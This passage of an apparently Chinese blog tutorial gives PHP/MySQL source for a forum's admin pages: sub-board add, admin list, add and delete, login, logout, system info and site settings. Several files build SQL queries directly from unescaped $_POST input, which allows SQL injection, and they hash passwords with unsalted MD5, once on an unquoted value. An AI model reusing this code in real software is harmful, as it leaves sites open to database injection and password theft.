type=&quot;text&quot; name=&quot;module_name&quot; value=&quot;&lt;?php echo $data[&#39;module_name&#39;]?&gt;&quot; class=&quot;common-text&quot; /&gt;&lt;/td&gt;                            &lt;td&gt;版块名称不能为空，最多不超过40个字符&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;版块简介&lt;/td&gt;                            &lt;td&gt;                                &lt;textarea name=&quot;info&quot; id=&quot;txtCon&quot; rows=&quot;6&quot; cols=&quot;50&quot;&gt;&lt;?php echo $data[&#39;info&#39;]?&gt;&lt;/textarea&gt;                            &lt;/td&gt;                            &lt;td&gt;版块名称不能为空，最多不超过300个字符&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;版主&lt;/td&gt;                            &lt;td&gt;                                &lt;select name=&quot;member_id&quot;&gt;                                    &lt;option value=&quot;0&quot;&gt;===请选择一个会员作为版主===&lt;/option&gt;                                &lt;/select&gt;                            &lt;/td&gt;                            &lt;td&gt;可以选择一个会员作为版主&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;排序&lt;/td&gt;                            &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sort&quot; class=&quot;common-text&quot; value=&quot;&lt;?php echo $data[&#39;sort&#39;]?&gt;&quot;/&gt;&lt;/td&gt;                            &lt;td&gt;填入一个数字即可&lt;/td&gt;                        &lt;/tr&gt;                    &lt;/table&gt;                    &lt;br /&gt;                    &lt;input class=&quot;btn btn-primary btn6 mr10&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;修改&quot; /&gt;        &lt;/div&gt;        &lt;/form&gt;  &lt;/div&gt;&lt;/div&gt;&lt;?php include &#39;inc/footer.inc.php&#39;?&gt;</code></pre><p><strong>同样，在子版块中，只有子版块列表是不够的。所以，也要实现子版块的添加。</strong>其中应该选择一个所属父版块，用<code>&lt;option&gt;</code>标签实现列出所有父版块的名字。</p><p><strong>4.son_module_add.php</strong></p><pre><code class="php">&lt;?php include_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;include_once &#39;../inc/tool.inc.php&#39;;$template[&#39;title&#39;]=&#39;子版块添加页&#39;;$link=connect();include_once &#39;inc/is_manage_login.inc.php&#39;;if(isset($_POST[&#39;submit&#39;])){    //验证用户填写的信息    $check_flag=&#39;add&#39;;    include &#39;inc/check_son_module.inc.php&#39;;    $query=&quot;insert into son_module(father_module_id,module_name,info,member_id,sort) values({$_POST[&#39;father_module_id&#39;]},&#39;{$_POST[&#39;module_name&#39;]}&#39;,&#39;{$_POST[&#39;info&#39;]}&#39;,{$_POST[&#39;member_id&#39;]},{$_POST[&#39;sort&#39;]})&quot;;    execute($link,$query);    if(mysqli_affected_rows($link)==1){        skip(&#39;son_module.php&#39;,&#39;onCorrect.gif&#39;,&#39;恭喜你，添加成功！&#39;);    }else{        skip(&#39;son_module_add.php&#39;,&#39;onError.gif&#39;,&#39;对不起，添加失败，请重试！&#39;);    }}?&gt;&lt;?phpinclude_once &#39;inc/header.inc.php&#39;;//topinclude_once &#39;inc/sidebar.inc.php&#39;;//sidebar?&gt;&lt;div class=&quot;main-wrap&quot;&gt;        &lt;div class=&quot;crumb-wrap&quot;&gt;            &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;father_module.php&quot;&gt;父板块列表&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;添加子版块&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;form method=&quot;post&quot;&gt;        &lt;div class=&quot;result-content&quot;&gt;                    &lt;table class=&quot;result-tab&quot; width=&quot;80%&quot;&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;所属父版块&lt;/td&gt;                            &lt;td&gt;                                &lt;select name=&quot;father_module_id&quot;&gt;                                    &lt;option value=&quot;0&quot;&gt;===请选择一个父版块===&lt;/option&gt;                                    &lt;?php                                    $query=&quot;select*from father_module&quot;;                                    $result_father=execute($link,$query);                                    while($data_father=mysqli_fetch_assoc($result_father)){                                        echo &quot;&lt;option value=&#39;{$data_father[&#39;Id&#39;]}&#39;&gt;{$data_father[&#39;module_name&#39;]}&lt;/option&gt;&quot;;                                    }                                    ?&gt;                                &lt;/select&gt;                            &lt;/td&gt;                            &lt;td&gt;*请选择一个父版块&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;版块名称&lt;/td&gt;                            &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;module_name&quot; class=&quot;common-text&quot; /&gt;&lt;/td&gt;                            &lt;td&gt;版块名称不能为空，最多不超过40个字符&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;版块简介&lt;/td&gt;                            &lt;td&gt;                                &lt;textarea name=&quot;info&quot; id=&quot;txtCon&quot; rows=&quot;6&quot; cols=&quot;50&quot;&gt;&lt;/textarea&gt;                            &lt;/td&gt;                            &lt;td&gt;版块名称不能为空，最多不超过300个字符&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;版主&lt;/td&gt;                            &lt;td&gt;                                &lt;select name=&quot;member_id&quot;&gt;                                    &lt;option value=&quot;0&quot;&gt;===请选择一个会员作为版主===&lt;/option&gt;                                &lt;/select&gt;                            &lt;/td&gt;                            &lt;td&gt;可以选择一个会员作为版主&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;排序&lt;/td&gt;                            &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;sort&quot; class=&quot;common-text&quot; /&gt;&lt;/td&gt;                            &lt;td&gt;填入一个数字即可&lt;/td&gt;                        &lt;/tr&gt;                    &lt;/table&gt;                    &lt;br /&gt;                    &lt;input class=&quot;btn btn-primary btn6 mr10&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;添加&quot; /&gt;        &lt;/div&gt;        &lt;/form&gt;  &lt;/div&gt;&lt;/div&gt;&lt;?php include &#39;inc/footer.inc.php&#39;?&gt;</code></pre><h4 id="四、后台-管理员"><a href="#四、后台-管理员" class="headerlink" title="四、后台-管理员"></a>四、后台-管理员</h4><p><strong>管理员列表</strong></p><p><img src="http://img-blog.csdnimg.cn/20190716170613859.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>除操作数据表外，大致和父版块类似。要注意的是，管理员有超级管理员和普通管理员，超级管理员可以添加删除管理员，普通管理员不具有管理管理员操作权限。</p><p><strong>1.manage.php</strong></p><pre><code class="php">&lt;?phpinclude_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;include_once &#39;../inc/tool.inc.php&#39;;$link=connect();include_once &#39;inc/is_manage_login.inc.php&#39;;$template[&#39;title&#39;]=&#39;管理员列表页&#39;;?&gt;&lt;?phpinclude_once &#39;inc/header.inc.php&#39;;//topinclude_once &#39;inc/sidebar.inc.php&#39;;//sidebar?&gt;&lt;div class=&quot;main-wrap&quot;&gt;        &lt;div class=&quot;crumb-wrap&quot;&gt;            &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;index.php&quot;&gt;后台首页&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;管理员列表&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;div class=&quot;result-wrap&quot;&gt;            &lt;form name=&quot;myform&quot; id=&quot;myform&quot; method=&quot;post&quot;&gt;                &lt;div class=&quot;result-title&quot;&gt;                    &lt;div class=&quot;result-list&quot;&gt;                        &lt;a href=&quot;manage_add.php&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;新增管理员&lt;/a&gt;                    &lt;/div&gt;                &lt;/div&gt;                &lt;div class=&quot;result-content&quot;&gt;                    &lt;table class=&quot;result-tab&quot; width=&quot;100%&quot;&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;5%&quot;&gt;&lt;input class=&quot;allChoose&quot; name=&quot;&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;th&gt;ID&lt;/th&gt;                            &lt;th&gt;名称&lt;/th&gt;                                          &lt;th&gt;等级&lt;/th&gt;                            &lt;th&gt;创建日期&lt;/th&gt;                            &lt;th&gt;操作&lt;/th&gt;                        &lt;/tr&gt;                        &lt;?php                        $query=&quot;select*from manage&quot;;                        $result=execute($link,$query);                        while ($data=mysqli_fetch_assoc($result)){                            if($data[&#39;level&#39;]==0){                                $data[&#39;level&#39;]=&#39;超级管理员&#39;;                            }else{                                $data[&#39;level&#39;]=&#39;普通管理员&#39;;                            }                            $url=urlencode(&quot;manage_delete.php?id={$data[&#39;Id&#39;]}&quot;);                            $return_url=urlencode($_SERVER[&#39;REQUEST_URI&#39;]);                            $message=&quot;你真的要删除管理员 {$data[&#39;username&#39;]} 吗？&quot;;                            $delete_url=&quot;confirm.php?url={$url}&amp;return_url={$return_url}&amp;message={$message}&quot;;$html=&lt;&lt;&lt;A                            &lt;tr&gt;                                &lt;td class=&quot;tc&quot;&gt;&lt;input name=&quot;id[]&quot; value=&quot;59&quot; type=&quot;checkbox&quot;&gt;&lt;/td&gt;                                &lt;td&gt;{$data[&#39;Id&#39;]}&lt;/td&gt;                                &lt;td&gt;{$data[&#39;username&#39;]}&lt;/td&gt;                                &lt;td&gt;{$data[&#39;level&#39;]}&lt;/td&gt;                                &lt;td&gt;{$data[&#39;create_time&#39;]}&lt;/td&gt;                                &lt;td&gt;&lt;a href=&quot;{$delete_url}&quot;&gt;[删除]&lt;/a&gt;&lt;/td&gt;                            &lt;/tr&gt;A;                            echo $html;                        }                    ?&gt;                    &lt;/table&gt;                &lt;/div&gt;            &lt;/form&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/main--&gt;&lt;/div&gt;&lt;?php include_once &#39;inc/footer.inc.php&#39;;//footer?&gt;</code></pre><p><strong>2.manage_delete.php</strong></p><pre><code class="php">&lt;?php include_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;include_once &#39;../inc/tool.inc.php&#39;;if(!isset($_GET[&#39;id&#39;]) || !is_numeric($_GET[&#39;id&#39;])){    skip(&#39;manage.php&#39;,&#39;onError.gif&#39;,&#39;id参数错误！&#39;);}$link=connect();include_once &#39;inc/is_manage_login.inc.php&#39;;$query=&quot;delete from manage where id={$_GET[&#39;id&#39;]}&quot;;execute($link,$query);if(mysqli_affected_rows($link)==1){    skip(&#39;manage.php&#39;,&#39;onCorrect.gif&#39;,&#39;恭喜你删除成功！&#39;);}else{    skip(&#39;manage.php&#39;,&#39;onError.gif&#39;,&#39;对不起删除失败，请重试！&#39;);}?&gt;</code></pre><p><strong>3.manage_add.php</strong></p><pre><code class="php">&lt;?phpinclude_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;include_once &#39;../inc/tool.inc.php&#39;;$link=connect();include_once &#39;inc/is_manage_login.inc.php&#39;;if(isset($_POST[&#39;submit&#39;])){    $link=connect();    include &#39;inc/check_manage.inc.php&#39;;    $query=&quot;insert into manage(username,password,create_time,level) values(&#39;{$_POST[&#39;username&#39;]}&#39;,md5({$_POST[&#39;password&#39;]}),now(),{$_POST[&#39;level&#39;]})&quot;;    execute($link,$query);    if(mysqli_affected_rows($link)==1){        skip(&#39;manage.php&#39;,&#39;onCorrect.gif&#39;,&#39;恭喜你，添加成功！&#39;);    }else{        skip(&#39;manage.php&#39;,&#39;onError.gif&#39;,&#39;对不起，添加失败，请重试！&#39;);    }}$template[&#39;title&#39;]=&#39;管理员添加页&#39;;?&gt;&lt;?phpinclude_once &#39;inc/header.inc.php&#39;;//topinclude_once &#39;inc/sidebar.inc.php&#39;;//sidebar?&gt;&lt;div class=&quot;main-wrap&quot;&gt;        &lt;div class=&quot;crumb-wrap&quot;&gt;            &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;manage.php&quot;&gt;管理员列表&lt;/a&gt;&lt;span class=&quot;crumb-step&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crumb-name&quot;&gt;添加管理员&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;form method=&quot;post&quot;&gt;        &lt;div class=&quot;result-content&quot;&gt;                    &lt;table class=&quot;result-tab&quot; width=&quot;70%&quot;&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; name=&quot;&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;管理员名称&lt;/td&gt;                            &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;common-text&quot; /&gt;&lt;/td&gt;                            &lt;td&gt;版块名称不能为空，最多不超过32个字符&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;密码&lt;/td&gt;                            &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;password&quot; class=&quot;common-text&quot; /&gt;&lt;/td&gt;                            &lt;td&gt;不能少于6位&lt;/td&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                            &lt;th class=&quot;tc&quot; width=&quot;7%&quot;&gt;&lt;input class=&quot;allChoose&quot; type=&quot;checkbox&quot;&gt;&lt;/th&gt;                            &lt;td&gt;等级&lt;/td&gt;                            &lt;td&gt;                                &lt;select name=&quot;level&quot;&gt;                                    &lt;option value=&quot;1&quot;&gt;普通管理员&lt;/option&gt;                                    &lt;option value=&quot;0&quot;&gt;超级管理员&lt;/option&gt;                                &lt;/select&gt;                            &lt;/td&gt;                            &lt;td&gt;请选择管理员等级,默认为普通管理员(不具备后台管理员管理权限)&lt;/td&gt;                        &lt;/tr&gt;                    &lt;/table&gt;                    &lt;br /&gt;                    &lt;input class=&quot;btn btn-primary btn6 mr10&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;添加&quot; /&gt;        &lt;/div&gt;        &lt;/form&gt;  &lt;/div&gt;&lt;/div&gt;&lt;?php include_once &#39;inc/footer.inc.php&#39;;//footer?&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190716170633931.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>4.管理员登录login.php</strong></p><pre><code class="php">&lt;?phpheader(&#39;Content-type:text/html;charset=utf-8&#39;);include_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;include_once &#39;../inc/tool.inc.php&#39;;$link=connect();if(is_manage_login($link)){    skip(&#39;index.php&#39;,&#39;onCorrect.gif&#39;,&#39;您已经登录，请不要重复登录！&#39;);}if(isset($_POST[&#39;submit&#39;])){    include_once &#39;inc/check_login.inc.php&#39;;    $_POST=escape($link,$_POST);    $query=&quot;select * from manage where username=&#39;{$_POST[&#39;username&#39;]}&#39; and password=md5(&#39;{$_POST[&#39;password&#39;]}&#39;)&quot;;    $result=execute($link, $query);    if(mysqli_num_rows($result)==1){        $data=mysqli_fetch_assoc($result);        $_SESSION[&#39;manage&#39;][&#39;username&#39;]=$data[&#39;username&#39;];        $_SESSION[&#39;manage&#39;][&#39;password&#39;]=sha1($data[&#39;password&#39;]);        $_SESSION[&#39;manage&#39;][&#39;id&#39;]=$data[&#39;Id&#39;];        $_SESSION[&#39;manage&#39;][&#39;level&#39;]=$data[&#39;level&#39;];        skip(&#39;index.php&#39;,&#39;onCorrect.gif&#39;,&#39;登录成功！&#39;);    }else{        skip(&#39;login.php&#39;,&#39;onError.gif&#39;,&#39;用户名或者密码错误，请重试！&#39;);    }}?&gt;&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;后台管理登录&lt;/title&gt;    &lt;link href=&quot;css/admin_login.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;admin_login_wrap&quot;&gt;    &lt;h1&gt;后台管理登录&lt;/h1&gt;    &lt;div class=&quot;adming_login_border&quot;&gt;        &lt;div class=&quot;admin_input&quot;&gt;            &lt;form method=&quot;post&quot;&gt;                &lt;ul class=&quot;admin_items&quot;&gt;                    &lt;li&gt;                        &lt;label for=&quot;username&quot;&gt;用户名：&lt;/label&gt;                        &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; size=&quot;40&quot; class=&quot;admin_input_style&quot; /&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label for=&quot;password&quot;&gt;密 码：&lt;/label&gt;                        &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; size=&quot;40&quot; class=&quot;admin_input_style&quot; /&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label for=&quot;vcode&quot;&gt;验证码:&lt;/label&gt;                        &lt;input name=&quot;vcode&quot; type=&quot;text&quot; size=&quot;40&quot; class=&quot;admin_input_style&quot; /&gt;                        &lt;a href=&quot;login.php&quot;&gt;&lt;img class=&quot;vcode&quot; src=&quot;../show_code.php&quot; /&gt;&lt;/a&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; tabindex=&quot;3&quot; value=&quot;提交&quot; class=&quot;btn btn-primary&quot; /&gt;                    &lt;/li&gt;                &lt;/ul&gt;            &lt;/form&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;p class=&quot;admin_copyright&quot;&gt;&lt;a tabindex=&quot;5&quot; href=&quot;index.php&quot; target=&quot;_blank&quot;&gt;返回首页&lt;/a&gt; &amp;copy; 2019 Powered by &lt;a href=&quot;http://qwzf.github.io&quot; target=&quot;_blank&quot;&gt;Q子枫&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/201907161706497.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>5.管理员注销logout.php</strong></p><pre><code class="php">&lt;?php include_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;include_once &#39;../inc/tool.inc.php&#39;;$link=connect();if(!is_manage_login($link)){    header(&#39;Location:login.php&#39;);}else{    session_unset();//Free all session variables    session_destroy();//销毁一个会话中的全部数据    setcookie(session_name(),&#39;&#39;,time()-3600,&#39;/&#39;);//销毁保存在客户端的卡号（session id）    header(&#39;Location:login.php&#39;);}?&gt;</code></pre><h4 id="五、后台-系统"><a href="#五、后台-系统" class="headerlink" title="五、后台-系统"></a>五、后台-系统</h4><p><strong>1.系统信息index.php</strong></p><p><img src="http://img-blog.csdnimg.cn/20190716170700307.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>要实现上述系统信息的显示，一些sql查询计数语句足矣！！</p><pre><code class="php">&lt;?phpinclude_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;include_once &#39;../inc/tool.inc.php&#39;;$link=connect();include_once &#39;inc/is_manage_login.inc.php&#39;;$query=&quot;select * from manage where id={$_SESSION[&#39;manage&#39;][&#39;id&#39;]}&quot;;$result_manage=execute($link, $query);$data_manage=mysqli_fetch_assoc($result_manage);$query=&quot;select count(*) from father_module&quot;;$count_father_module=num($link,$query);$query=&quot;select count(*) from son_module&quot;;$count_son_module=num($link,$query);$query=&quot;select count(*) from content&quot;;$count_content=num($link,$query);$query=&quot;select count(*) from reply&quot;;$count_reply=num($link,$query);$query=&quot;select count(*) from member&quot;;$count_member=num($link,$query);$query=&quot;select count(*) from manage&quot;;$count_manage=num($link,$query);if($data_manage[&#39;level&#39;]==&#39;0&#39;){    $data_manage[&#39;level&#39;]=&#39;超级管理员&#39;;}else{    $data_manage[&#39;level&#39;]=&#39;普通管理员&#39;;}$template[&#39;title&#39;]=&#39;系统信息&#39;;?&gt;&lt;?phpinclude_once &#39;inc/header.inc.php&#39;;//topinclude_once &#39;inc/sidebar.inc.php&#39;;//sidebar?&gt;    &lt;div class=&quot;main-wrap&quot;&gt;        &lt;div class=&quot;crumb-wrap&quot;&gt;            &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&amp;#xe06b;&lt;/i&gt;&lt;span&gt;欢迎管理员&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;div class=&quot;result-wrap&quot;&gt;            &lt;div class=&quot;result-title&quot;&gt;                &lt;h1&gt;系统基本信息&lt;/h1&gt;            &lt;/div&gt;            &lt;div class=&quot;result-content&quot;&gt;                &lt;ul class=&quot;sys-info-list&quot;&gt;                    &lt;li&gt;                        &lt;label class=&quot;res-lab&quot;&gt;您好: &lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo $data_manage[&#39;username&#39;]?&gt;&lt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label class=&quot;res-lab&quot;&gt;所属角色：&lt;/label&gt;&lt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo $data_manage[&#39;level&#39;]?&gt; &lt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label class=&quot;res-lab&quot;&gt;创建时间：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo $data_manage[&#39;create_time&#39;]?&gt;&lt;/span&gt;                    &lt;/li&gt;                &lt;/ul&gt;            &lt;/div&gt;            &lt;br /&gt;            &lt;div class=&quot;result-content&quot;&gt;                &lt;ul&gt;                    &lt;li&gt;                         &lt;span class=&quot;res-info&quot;&gt;                            父版块(&lt;?php echo $count_father_module?&gt;)                            子版块(&lt;?php echo $count_son_module?&gt;)                            帖子(&lt;?php echo $count_content?&gt;)                            回复(&lt;?php echo $count_reply?&gt;)                            会员(&lt;?php echo $count_member?&gt;)                            管理员(&lt;?php echo $count_manage?&gt;)                        &lt;/span&gt;                    &lt;/li&gt;                &lt;/ul&gt;            &lt;/div&gt;            &lt;br /&gt;            &lt;div class=&quot;result-content&quot;&gt;                &lt;ul&gt;                    &lt;li&gt;                        &lt;label class=&quot;res-lab&quot;&gt;服务器操作系统：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo PHP_OS?&gt;&lt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label class=&quot;res-lab&quot;&gt;服务器软件：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo $_SERVER[&#39;SERVER_SOFTWARE&#39;]?&gt;&lt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label class=&quot;res-lab&quot;&gt;MySQL 版本：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo  mysqli_get_server_info($link)?&gt;&lt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label class=&quot;res-lab&quot;&gt;最大上传文件：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo ini_get(&#39;upload_max_filesize&#39;)?&gt;&lt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label class=&quot;res-lab&quot;&gt;内存限制：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo ini_get(&#39;memory_limit&#39;)?&gt;&lt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;span class=&quot;res-info&quot;&gt;&lt;a target=&quot;_blank&quot; href=&quot;phpinfo.php&quot;&gt;PHP 配置信息&lt;/a&gt;&lt;/span&gt;                    &lt;/li&gt;                &lt;/ul&gt;            &lt;/div&gt;            &lt;br /&gt;            &lt;div class=&quot;result-content&quot;&gt;                &lt;ul&gt;                    &lt;li&gt;                        &lt;label class=&quot;res-lab&quot;&gt;程序安装位置(绝对路径)：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo SA_PATH?&gt;&lt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label class=&quot;res-lab&quot;&gt;程序在web根目录下的位置(首页的url地址)：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;&lt;?php echo SUB_URL?&gt;&lt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label class=&quot;res-lab&quot;&gt;程序版本：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;Qwzf V1.0 &lt;a target=&quot;_blank&quot; href=&quot;#&quot;&gt;[查看最新版本]&lt;/a&gt;&lt;/span&gt;                    &lt;/li&gt;                    &lt;li&gt;                        &lt;label class=&quot;res-lab&quot;&gt;程序作者：&lt;/label&gt;&lt;span class=&quot;res-info&quot;&gt;Qwzf &lt;/span&gt;                    &lt;/li&gt;                &lt;/ul&gt;            &lt;/div&gt;            &lt;br /&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/main--&gt;&lt;/div&gt;&lt;?php include_once &#39;inc/footer.inc.php&#39;;//footer?&gt;</code></pre><p>查看PHP配置信息时跳转到另一个页面，用PHP自带查询配置信息语句。</p><p><strong>phpinfo.php</strong></p><pre><code class="php">&lt;?php include_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;include_once &#39;../inc/tool.inc.php&#39;;$link=connect();include_once &#39;inc/is_manage_login.inc.php&#39;;//验证管理员是否登录phpinfo();?&gt;</code></pre><p><strong>2.站点设置system.php</strong></p><p><img src="http://img-blog.csdnimg.cn/2019071617071589.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这是一个表单提交，提交网站标题、关键字、描述到数据库。且把网站标题从数据库查询，在页面标题处输出，即在顶部文件header.inc.php输出该页查询的网站标题。</p><pre><code class="php">&lt;?phpinclude_once &#39;../inc/config.inc.php&#39;;include_once &#39;../inc/mysql.inc.php&#39;;include_once &#39;../inc/tool.inc.php&#39;;$link=connect();include_once &#39;inc/is_manage_login.inc.php&#39;;$query=&quot;select * from info where Id=1&quot;;$result_info=execute($link, $query);$data_info=mysqli_fetch_assoc($result_info);if(isset($_POST[&#39;submit&#39;])){    $_POST=escape($link,$_POST);    $query=&quot;update info set title=&#39;{$_POST[&#39;title&#39;]}&#39;,keywords=&#39;{$_POST[&#39;keywords&#39;]}&#39;,description=&#39;{$_POST[&#39;description&#39;]}&#39; where Id=1&quot;;    execute($link, $query);    if(mysqli_affected_rows($link)==1){        skip(&#39;system.php&#39;,&#39;onCorrect.gif&#39;,&#39;修改成功！&#39;);    }else{        skip(&#39;system.php&#39;,&#39;onError.gif&#39;,&#39;修改失败,请重试！&#39;);    }}$template[&#39;title&#39;]=&#39;站点设置页&#39;;?&gt;&lt;?phpinclude_once &#39;inc/header.inc.php&#39;;//topinclude_once &#39;inc/sidebar.inc.php&#39;;//sidebar?&gt;    &lt;div class=&quot;main-wrap&quot;&gt;        &lt;div class=&quot;crumb-wrap&quot;&gt;            &lt;div class=&quot;crumb-list&quot;&gt;&lt;i class=&quot;icon-font&quot;&gt;&lt;/i&gt;&lt;a href=&quot;index.php&quot;&gt;首页&lt;/a&gt;&lt;span 